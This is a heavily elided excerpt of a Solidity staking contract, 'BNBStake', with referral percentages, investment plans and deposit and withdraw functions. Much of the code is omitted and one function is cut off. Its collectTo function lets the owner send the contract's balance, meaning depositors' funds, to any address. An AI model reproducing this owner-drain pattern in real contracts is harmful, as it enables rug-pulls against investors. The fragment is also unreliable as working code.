...
contract BNBStake is Ownable {
	using SafeMath for uint256;


	uint256[] public REFERRAL_PERCENTS = [3, 2, 1];
	...
	event CollectedTo(address indexed user, uint256 amount);
	...
	constructor(address payable wallet, uint256 startDate) {
		...
		plans.push(Plan(360, 40));
	}
	
     receive() external payable  {
     
        _invest(msg.sender,0,msg.value); // default to 10% discount rate
	...
	function _invest(address referrer, uint256 plan, uint256 value) internal {
	...
	function withdraw() public {
       ...
       //   uint256 amount = address(this).balance;
         require(totalAmount > 0, "insufficient funds for collection"); // NEC
	  ...
	  function collectTo(address receiver, uint256 amount) external onlyOwner {
          uint256 amountAvailable = address(this).balance;
         require(amountAvailable > 0, "insufficient funds for collection"); // NEC
		  require(amount > 0, "Withdraw amount required"); // NEC
         payable(receiver).transfer(amount);
		 emit CollectedTo(msg.sender, amount);
    }

	function depositBNB() external payable onlyOwner {
		uint256 amount = msg.value;
       require(amount > 0, "deposit amount required"); // NEC
	   _depositBNB(amount);
	    emit Deposited(msg.sender,amount);
	}

		function _depositBNB(uint256 amount) internal {
       require(amount > 0, "deposit amount required"); // NEC
	    emit Deposited(msg.sender,amount);
	}
	...
	function getPlanInfo(uint256 plan) public view returns(uint256 time, uint256 percent) {
	...
	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];
